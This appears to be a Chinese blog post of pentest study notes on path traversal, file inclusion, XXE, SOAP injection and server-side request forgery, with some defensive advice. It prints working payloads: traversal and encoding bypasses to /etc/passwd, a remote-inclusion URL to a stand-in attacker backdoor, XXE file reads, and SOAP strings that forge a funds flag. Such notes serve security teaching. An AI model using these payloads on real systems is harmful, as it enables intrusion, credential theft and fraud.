<h4 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h4><h5 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h5><p>在对应用程序分析的步骤中，一般就需要确定潜在的攻击面，主要用于文件的上传和下载的功能（例如可共享文档的应用程序、允许用户上传图像的博客、商品信息上传的拍卖平台、为用户提供电子书、技术手册、公司报表等信息型应用程序）；这些功能都有一个特征，即需要跟文件系统进行交互；</p>
<p>渗透测试步骤</p>
<ul>
<li>在解析应用程序功能的过程中，留意在请求参数中带有文件名或目录名的情形，例如 include&#x3D;main.inc 或者 template&#x3D;&#x2F;en&#x2F;sidebar；或者需要从服务端的文件系统中读取数据的功能，例如显示和下载图像；</li>
<li>在测试其他漏洞的过程中，留意一些反常事件或者有益的错误消息，看看是否有可能是因为用户提交的数据被传递给文件系统的 API 或者作为操作系统命令的参数；</li>
</ul>
<h5 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h5><p>当找到潜在的攻击目标后，设法确定漏洞是否存在，例如可以提交一个不会回溯到起始目录的遍历序列，例如将 file&#x3D;foo&#x2F;file.txt 参数修改为 file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt；</p>
<ul>
<li>如果服务端返回相同的结果，则说明漏洞很可能存在；</li>
<li>如果返回结果不同，则说明应用程序有对输入进行一定的过滤处理；此时需要找到过滤的规则，看是否有可能绕过它；</li>
</ul>
<p>如果发现漏洞可能存在，则尝试遍历出起始目录，例如可提交参数：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>n.ini<br><span class="hljs-comment"># 注：此处 ../ 的数量需要反复试验</span><br></code></pre></td></tr></table></figure>

<p>如果幸运的话，有可能得到如下结果：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201221193400.png" srcset="/img/loading.gif" lazyload></p>
<p>如果所攻击的功能拥有文件的写入权限，则可能不好确定该功能是否存在漏洞；因此需要确定一下写入的权限具体有多大；确定的办法是写两个文件：一个是任意用户均可实现写入的文件，另一个是即使根用户或者管理员也无法写入的文件；如果两次请求之间，应用程序表现出差异，则说明漏洞存在；</p>
<blockquote>
<p>关于文件路径的分隔符，Win 平台同时支持斜杠和反斜杠，但是 Unix 平台则只运行斜杠，因此最好二者都进行测试，以便能够覆盖并确认服务端使用的是哪种平台，或者哪种平台组件来</p>
</blockquote>
<h5 id="避开遍历攻击障碍"><a href="#避开遍历攻击障碍" class="headerlink" title="避开遍历攻击障碍"></a>避开遍历攻击障碍</h5><ul>
<li>应用程序可能只过滤一种序列，因此应同时尝试斜杠和反斜杠，因为文件系统两种格式都支持；</li>
<li>对遍历序列进行 URL 编码，例如点使用 %2e，斜杠使用 %2f，反斜杠使用 %5c</li>
<li>尝试使用 16 位的 Unicode 编码，例如点使用 %u002e，斜杠使用 %u2215，反斜杠使用 %u2216</li>
<li>尝试使用双倍 URL 编码，例如点使用 &amp;252e，斜杠使用 &amp;252f，反斜杠使用 %255c</li>
<li>尝试使用超长 UTF-8 编码，例如点使用 %c0%2e, %e0%40%ae, %c0ae；斜杠使用 %c0%af, %e0%80%cf, %c0%2f；反斜杠使用 %c0%5c, %c0%80%5c 等；</li>
<li>有很多字符可以使用非法的 Unicode 表示法来表示，它们被许多 Unicode 解码器识别并接受，尤其是 Windows 平台上面的解码器；</li>
<li>服务端正常应使用递归来净化客户端提交的输入，但有可能应用程序没有这么做，此时可以输入双序列，这样被过滤掉一个，仍然可以剩下一个发挥作用，例如： …. &#x2F;&#x2F;</li>
</ul>
<h5 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h5><p>服务端有时使用指定后缀的方式来检查客户端提交的请求，渗透测试步骤：</p>
<ul>
<li>在文件名和合法后缀之间放入一个使用 URL 编码的空字符，例如 “..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”；该方法能够生效的原因在于进行文件名检查的执行环境，和最终查找获取文件的环境不同，前者认为合法的字符串，到了获取环境变成了另外一种意思；</li>
<li>有些应用程序会只使用请求中的文件名，不包括后缀，然后自行在代码逻辑中添加后缀，这种情况下，前述的方式仍然可以起作用；</li>
<li>有些应用程序会检查文件名的开头是否是一个合法的目录，这种情况只需要配套使用双点即可避免检查，例如：filestore&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwc；</li>
<li>如果以上针对输入过滤的渗透都无法成功，则应用程序可能实施了多加复合的过滤方式，此时可以先从一个可以成功的请求做为起点，例如 foo.jpg，然后请求 bar&#x2F;..&#x2F;foo.jpg 如果失败的话，则尝试所有可能的遍历序列方式，直到该请求获得成功为止；如果仍然还是不行，则尝试请求 foo.jpg%00.jpg，看是否能够避开过滤；彻底检查应用程序的默认目录，了解它使用的所有过滤方式，然后针对这些过滤方式设计避开的技巧；</li>
</ul>
<h5 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h5><p>有些应用程序会对用户上传文件的文件名使用某种编码方案后，再返回编码后的名称做为访问该文件的 URL 地址；因此，可以利用该编码方案是否对路径进行规范化的漏洞来尝试获取想要的文件；</p>
<ul>
<li>先通过简单的文件名，测试编码方案，例如上传文件 test.txt，看它编码后的结果，例如为 zM1YTU4NTY2Y；</li>
<li>再尝试上传文件 foo&#x2F;..&#x2F;test.txt，看它编码后的结果是否仍为上一步的结果，还是长度有变化，如果有变化，则意味着应用程序没有对路径进行规范化，因此有漏洞；</li>
<li>尝试提交 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;etc&#x2F;passwd&#x2F;..&#x2F;..&#x2F;tmp&#x2F;foo，它规范化的形式为 &#x2F;tmp&#x2F;foo，得到它的编码结果，然后截短它，以便得到路径的前半部分，这样就可以用来获取 &#x2F;etc&#x2F;passwd 文件；（此处需要留意编码对齐问题，因为类似 Base64 的编码方案是以三个字符为单位的，因此需要在路径中添加合适数量的点号来凑齐字符单位要求，同时不影响结果）；</li>
</ul>
<h5 id="利用遍历漏洞"><a href="#利用遍历漏洞" class="headerlink" title="利用遍历漏洞"></a>利用遍历漏洞</h5><p>当发现一个路径遍历漏洞后，通常攻击在服务器上将拥有和应用程序相同的读写权限；该漏洞可以用来做如下事情：</p>
<ul>
<li>获取操作系统与应用程序的密码文件；</li>
<li>获取服务器和应用程序的配置文件（可用来发现其他漏洞或优化其他攻击）；</li>
<li>可能获取数据库证书文件；</li>
<li>应用程序的数据源，例如 MySQL 数据库文件或 XML 文件；</li>
<li>服务器可执行页面的源代码（可用来做代码审查，搜索代码中的其他漏洞）；</li>
<li>可能包含用户名和会话令牌的应用程序日志文件；</li>
</ul>
<p>如果发现一个可写入任意的漏洞，则可以利用它在服务器上执行任意命令；</p>
<ul>
<li>在用户的启动文件夹中创建脚本；</li>
<li>当用户下一次连接时，修改 in.ftpd 等文件执行任意命令；</li>
<li>向一个拥有执行权限的 Web 目录写入脚本，然后通过浏览器访问它们，触发脚本的执行；</li>
</ul>
<h4 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h4><p>避免向文件系统传递任何用户提交的数据，是防御路径遍历漏洞的最好办法；如果必须允许用户指定上传文件的名称，则需要设置多重的防御组合：</p>
<ul>
<li>在对用户提交的文件名进行解码和规范化后，应检查文件名中是否包含路径遍历序列（例如斜杠和反斜杠）和空字节；如果有的话，则判定为恶意请求并停止处理，不得尝试对其进行净化；</li>
<li>应用使用应使用一个硬编码的可访问文件类型的列表，并拒绝访问其他类型文件的请求；</li>
<li>在进行过滤后，应用程序应检查文件是否位于指定的目录中（例如使用 get_full_path 之类的方法，获取文件的绝对路径，然后进行检查）；如果发现不在指定目录，则停止处理请求；</li>
<li>应用程序可使用 chrooted 文件系统来包含被访问文件的目录，该目录会自动忽略尝试向上遍历的请求（大多数 Linux 版本都支持 chrooted 文件系统）；</li>
<li>应用程序应将路径遍历攻击和日志及警报机制融合在一起，任何时候，只要收到一个非法请求，就发出警报，终止该用户的会话，冻结该账户，并通知管理员；</li>
</ul>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>有些脚本语言允许使用类似 include 的命令，来将某段代码插入到某个指定的位置，然后执行它们；</p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>PHP 语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径，这种缺陷j是 PHP 出现了大量漏洞的根源；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 应用程序接一个位置参数，然后根据该参数调用相应的 php 文件，执行其中的代码</span><br><span class="hljs-comment"># 请求地址：https://whatever-app.com/main.php?country=US</span><br><span class="hljs-variable">$country</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;country&#x27;</span>];<br><span class="hljs-keyword">include</span>( <span class="hljs-variable">$country</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>由于 PHP 支持外部路径，因此攻击者可以通过传入一个远程 php 文件路径，让应用程序执行攻击想要执行的任意代码；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># https://whatever-app.com/main.php?country=http://attacker-app.com/backdoor</span><br></code></pre></td></tr></table></figure>

<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>有些应用程序根据用户的输入，加载并执行某个本地文件，则用户可以利用这个漏洞</p>
<ul>
<li>让应用程序执行某个本应授权访问才能实现的功能；</li>
<li>访问服务上某些受保护的静态资源：通过将这些文件动态包含到应用程序的页面中，让执行环境将静态内容复制到响应中；</li>
</ul>
<h4 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h4><p>任何用户提交的数据项都可能产生文件包含漏洞，常常出现于由用户提交参数指定国家语言或者地理位置、由用户提交参数指定服务器的文件名；</p>
<p>远程文件包含的渗透测试步骤：</p>
<ul>
<li>向每一个目标参数提交一个连接受控制的 Web 服务器资源的 URL，然后监控受控制的服务器是否受到应用程序的请求；</li>
<li>尝试提交一个包含不存在的 IP 地址的 URL，看应用程序是否出现请求超时，如果是，说明应用程序尝试和该 IP 地址建立连接；</li>
<li>如果发现应用程序可受到远程文件包含攻击，则使用相关语言可用的 API，构建一段恶意脚本实施攻击；</li>
</ul>
<p>本地文件包含的渗透测试步骤：</p>
<ul>
<li>提交一个请求，指向服务器上一个已知可执行资源的名称，看应用程序的行为是否出现变化；</li>
<li>提交一个请求，指向服务器上一个已知静态资源的名称，看文件内容是否包含在响应中；</li>
<li>如果应用程序可受到本地包含文件攻击，则尝试通过 Web 服务器访问任何原本无法直接访问的敏感功能或资源；</li>
<li>尝试能够利用遍历技巧访问其他目录中的文件；</li>
</ul>
<h2 id="注入-XML-解释器"><a href="#注入-XML-解释器" class="headerlink" title="注入 XML 解释器"></a>注入 XML 解释器</h2><h3 id="注入-XML-外部实体"><a href="#注入-XML-外部实体" class="headerlink" title="注入 XML 外部实体"></a>注入 XML 外部实体</h3><p>标准的 XML 解析库支持使用实体引用，目的是用来在 XML 内部或外部引用数据；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!---内部实体在头部定义，以下定义在解析时，会将 testref 替代为指定的 testrefvalue ---&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">testref</span> <span class="hljs-string">&quot;testrefvalue&quot;</span> &gt;</span> ]&gt;</span><br></code></pre></td></tr></table></figure>

<p>XML 还支持引用外部实体，该外部实体可用 URL 来指定，届时解析时会访问该 URL，提取其中的值，替换 XML 内部的符号；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!---外部实体使用 SYSTEM 关键字来指定，引用时可使用 file 协议（本地文件）或者 http 协议（远程文件）；解析时，将会使用 win.ini 的内容来替代 xxe 字符串，攻击者间接获得 win.ini 的文件内容 ---&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///windows/win.ini&quot;</span> &gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Search</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SearchTerm</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SearchTerm</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Search</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>http 协议不仅可以用来获取传统意义上的远程服务，其实也可以访问其内网或者本地的其他进程服务；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!---获取本地局域网 192.168.1.1 的 25 端口上的邮件服务器---&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.1.1:25&quot;</span> &gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Search</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SearchTerm</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SearchTerm</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Search</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>通过 http 请求，可发起以下攻击：</p>
<ul>
<li>可将应用程序变成一个代理服务器，获得该应用程序能够访问的各种敏感内容，包括其内部局域网地址中的内容；</li>
<li>攻击某些应用程序中可通过 URL 进行访问的漏洞；</li>
<li>通过遍历 IP 地址和端口号，测试后端系统哪些端口是开放的；如果该端口有开放，一般在响应时间上有差异；有时候还会在响应中包含端口服务的标题；</li>
</ul>
<h3 id="注入-SOAP"><a href="#注入-SOAP" class="headerlink" title="注入 SOAP"></a>注入 SOAP</h3><p>SOAP 的全称是 simple object access protocol，指简单对象访问协议；它使用 XML 标准来封装消息，并在 Web 应用程序的不同模块之间传递这些消息；另外有些大型企业应用也使用 SOAP 在不同计算机之间传递消息，以协同完成某个任务；</p>
<blockquote>
<p>XML 令人蛋疼的地方在于它是一种解释型语言，有自己的语法格式，因此，可以通过它的语法，改变数据本身的意义</p>
</blockquote>
<p>假设某个转账的原始请求为</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit</p>
<p>在处理这个请求时，在 Web 应用程序的后端之间，使用 SOAP 封装的消息，此时请求被转换成如下格式</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">pre:Add</span>&gt;</span><br>        	<span class="hljs-tag">&lt;<span class="hljs-name">Account</span>&gt;</span><br>            	<span class="hljs-tag">&lt;<span class="hljs-name">AccountFrom</span>&gt;</span>18281008<span class="hljs-tag">&lt;/<span class="hljs-name">AccountFrom</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Amount</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">Amount</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ClearFunds</span>&gt;</span>False<span class="hljs-tag">&lt;/<span class="hljs-name">ClearFunds</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ToAccount</span>&gt;</span>08447656<span class="hljs-tag">&lt;/<span class="hljs-name">ToAccount</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Account</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">pre:Add</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>由于转出账户的余额不足，因此字段 ClearFunds 的值为 False，组件之间传递这条消息的目的是记录这笔交易请求，但同时并不真正转出金额，而是标记为转账失败；攻击者可以通过在原始请求中混入符合 XML 语法的字符，来改变消息的意义；</p>
<p>原始请求更改为：</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000</Amount><ClearedFunds>True</ClearedFunds><Amount>1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit</p>
<p>服务器在收到该请求后，如果没有对它进行净化和过滤，最终将解析成如下结果：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">pre:Add</span>&gt;</span><br>        	<span class="hljs-tag">&lt;<span class="hljs-name">Account</span>&gt;</span><br>            	<span class="hljs-tag">&lt;<span class="hljs-name">AccountFrom</span>&gt;</span>18281008<span class="hljs-tag">&lt;/<span class="hljs-name">AccountFrom</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Amount</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">Amount</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ClearFunds</span>&gt;</span>True<span class="hljs-tag">&lt;/<span class="hljs-name">ClearFunds</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Amount</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">Amount</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ClearFunds</span>&gt;</span>False<span class="hljs-tag">&lt;/<span class="hljs-name">ClearFunds</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ToAccount</span>&gt;</span>08447656<span class="hljs-tag">&lt;/<span class="hljs-name">ToAccount</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Account</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">pre:Add</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>此时应用程序的某个组件在处理该消息时，由于遇到的第一个 ClearFunds 字段的值是 True，因此有可能在账户余额不足的情况下，触发转账行为；</p>
<p>另外还可以通过注入注释，让某些 XML 字段失效，并用攻击者自己的元素替换被注释掉的元素；</p>
<p>原始请求设计为：</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000</Amount><ClearedFunds>True</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&amp;Submit&#x3D;Submit</p>
<p>服务端解析结果如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>    	<span class="hljs-tag">&lt;<span class="hljs-name">pre:Add</span>&gt;</span><br>        	<span class="hljs-tag">&lt;<span class="hljs-name">Account</span>&gt;</span><br>            	<span class="hljs-tag">&lt;<span class="hljs-name">AccountFrom</span>&gt;</span>18281008<span class="hljs-tag">&lt;/<span class="hljs-name">AccountFrom</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">Amount</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">Amount</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ClearFunds</span>&gt;</span>True<span class="hljs-tag">&lt;/<span class="hljs-name">ClearFunds</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ToAccount</span>&gt;</span><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    			&lt;ClearFundres&gt;False&lt;/ClearedFunds&gt;</span><br><span class="hljs-comment">    			&lt;ToAccount&gt;--&gt;</span>08447656<span class="hljs-tag">&lt;/<span class="hljs-name">ToAccount</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Account</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">pre:Add</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>请求的设计，让某部分 XML 字段被注释掉之后，仍然能够保持整体格式的合法性；</p>
</blockquote>
<h3 id="查找并利用-SOAP-注入"><a href="#查找并利用-SOAP-注入" class="headerlink" title="查找并利用 SOAP 注入"></a>查找并利用 SOAP 注入</h3><p>SOAP 注入漏洞可能不容易发现，主要是任意提交注入标签，会破坏 SOAP 的消息格式，而且只是因为格式错误而返回的错误提示也非常简单，并没有什么利用价值；</p>
<p>渗透测试步骤</p>
<ul>
<li>轮流在每个参数中提交一个恶意 XML 结束标签，例如 &lt;&#x2F;foo&gt;， 如果没有发生错误，说明输入要么没有插入到 SOAP 消息中，或者输入可能被净化了；</li>
<li>如果出现错误，再提交一对有效的起始与结束标签，例如 &lt;foo&gt;&lt;&#x2F;foo&gt;，如果错误消失了，则说明 SOAP 漏洞很可能存在；</li>
<li>查看提交的数据是否会在响应中返回，如果会的话，查看数据是原封不动的返回，还是以某种方式规范化了；轮流提交以下两个值，”test&lt;foo&#x2F;&gt;“ 和 “test&lt;foo&gt;&lt;&#x2F;foo&gt;“，如果返回的结果是 test，或者是另外一个值，则说明插入成功；</li>
<li>如果 HTTP 请求中包括多个参数，由于不知道这些参数在后端的生成顺序，因此，可以轮流在一个参数中插入注释字符串 “&lt;!–”，然后在另外一个参数中注入 “–&gt;“，看是否能够将 SOAP 消息的某个部分注释掉，从而破坏应用程序的逻辑，此时有可能造成非预期内的处理结果；</li>
</ul>
<p>SOAP 注入漏洞要能够利用成功，前提条件是知道整个 XML 的结构，这样才有办法设计专门的注入值，以便能够改变解析的结果；如果返回的错误消息不能提供这方面的信息的话，则漏洞就会很难发现；幸运的话，有可能返回的错误消息中会包含整个解析的结果，从而泄露了结构；运气不好的话，则攻击率会变得很低；</p>
<h3 id="防止-SOAP-注入"><a href="#防止-SOAP-注入" class="headerlink" title="防止 SOAP 注入"></a>防止 SOAP 注入</h3><p>防止 SOAP 注入的办法是对用户的输入进行边界确认，不仅包含确认用户的当前输入，还包括用户前面步骤的输入，或者应用程序基于用户输入在过程中产生的数据；</p>
<p>为了防止攻击，应用程序应对用户输入中出现的任何 XML 元字符进行 HTML 编码，用 HTML 编码替代用户输入中的字面值；这样做的目的是让 XML 解析器不会将用户输入中的 XML 元字符当作有意义的语义的组成部分；几个会造成注入漏洞的 XML 元字符为：</p>
<ul>
<li>左尖括号 &lt;，应编码为 &amp;1t</li>
<li>右尖括号 &gt;，应编码为 &amp;gt</li>
<li>斜杠 &#x2F;，应编码为 &amp;#47</li>
</ul>
<h2 id="注入后端-HTTP-请求"><a href="#注入后端-HTTP-请求" class="headerlink" title="注入后端 HTTP 请求"></a>注入后端 HTTP 请求</h2><p>应用程序经常会将用户输入弄成键值对的形式，嵌入到后端发起的 HTTP 请求中，因此攻击者可以利用这方面的漏洞将应用程序做为代理器，来访问一些本来没有权限访问的资源，例如：</p>
<ul>
<li>服务器端 HTTP 重定向：攻击者通过注入参数到后端发起的请求中，指定应用程序请求任意的资源或 URL；</li>
<li>HTTP 参数注入（HPI）：攻击者通过注入参数，覆盖应用程序发出的请求的指令，改变其行为逻辑和结果；</li>
</ul>
<h3 id="服务器端-HTTP-重定向"><a href="#服务器端-HTTP-重定向" class="headerlink" title="服务器端 HTTP 重定向"></a>服务器端 HTTP 重定向</h3><p>应用程序向客户端提供的功能有时并不是由应用程序本身来完成的，而是后端有部署其他组件来提供相应的功能，因此应用程序经常需要将用户的输入，转换成相应的参数，向后端组件发起相应的请求；</p>
<p>示例：以下由客户端发出的请求中，loc 参数指定了要获取的 CSS 文件的地址</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">view</span>=default&amp;loc=<span class="hljs-literal">on</span>line.wahh-blogs.net/css/wahh.css<br></code></pre></td></tr></table></figure>

<p>攻击者可以通过替换 loc 参数的值，来让应用程序向其指定的地址发起资源请求，如果应用程序没有对此进行确认和过滤，则攻击者可以将地址设置为后端服务器可以访问的任意资源；</p>
<p>示例：攻击者将地址替换为后端的 SSH 服务</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 请求，loc 参数值被替换</span><br><span class="hljs-attribute">view</span>=default&amp;loc=<span class="hljs-number">192.168.0.1:22</span><br><br><span class="hljs-comment"># 响应，包括了 SSH 服务的信息</span><br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">SSH</span>-<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-OpenSSH_4.<span class="hljs-number">2</span>Protocol mismatch.<br></code></pre></td></tr></table></figure>

<p>攻击者可以利用该漏洞，让应用程序成为一个开放的代理服务器，来实施各种其他攻击</p>
<ul>
<li>攻击者可以将该代理服务器用于攻击互联网上的第三方系统；</li>
<li>攻击者可以通过该服务器连接到组织内部网络中的任意主机，从而访问无法通过因特网直接访问的资源或服务；</li>
<li>攻击者可以利用该服务器反向连接到应用程序服务器上的其他服务，从而避开防火墙限制，并利用信任关系来避开身份验证；</li>
<li>攻击者可以让应用程序在响应中包括受控的内容，从而实施跨站点脚本等攻击；</li>
</ul>
<p>渗透测试步骤</p>
<ol>
<li>确定任何可能包含主机名、IP 地址或完整 URL 的请求参数；</li>
<li>对于每个参数，修改参数值，指向其他与所请求的资源类似的资源，观察该资源是否会出现在服务器的响应中；</li>
<li>尝试指定一个受控的 URL，然后监控在请求发出后，该 URL 是否被访问；</li>
<li>如果 URL 没有被连接，则观察请求的响应时间，如果时间很久，则有可能是因为某种访问规则的限制，导致应用程序的请求发不出去，导致超时；</li>
<li>如果能够成功发现漏洞，连接到任意的 URL，则可以尝试实施以下攻击：<ol>
<li>确认是否可以指定端口号，例如：<a target="_blank" rel="noopener" href="http://mdattacker.net:22/">http://mdattacker.net:22</a></li>
<li>如果可以指定端口号，尝试使用类似 Burp Intruder 等工具对内部网络的端口进行扫描，以逐个连接到一系列 IP 地址和端口；</li>
<li>尝试连接到应用程序服务器回环地址上的其他服务；</li>
<li>尝试将受控的 Web 页面加载到应用程序的响应中，以实现跨站点脚本攻击；</li>
</ol>
</li>
</ol>
<blockquote>
<p>有些服务器程序的重定向 API，例如 ASP.NET 中的 Server.Transfer 和 Server.Excecute，仅可重定向到同一主机上的相关URL，尽管如此，攻击者仍然可以利用信任关系，访问服务器上原本受保护的敏感资源；</p>
</blockquote>
